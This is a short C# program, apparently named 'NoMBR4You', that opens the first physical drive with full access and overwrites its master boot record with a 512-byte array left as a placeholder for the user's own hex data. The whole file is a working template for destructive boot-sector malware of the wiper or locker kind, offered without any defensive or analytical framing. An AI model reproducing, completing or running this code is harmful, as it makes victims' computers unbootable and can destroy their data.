using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NoMBR4You
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            byte[] mbrData = {/*Your Hex String Here*/};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, IntPtr.Zero, 0x3, 0, IntPtr.Zero);

            WriteFile(mbr, mbrData, 512, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    }
}
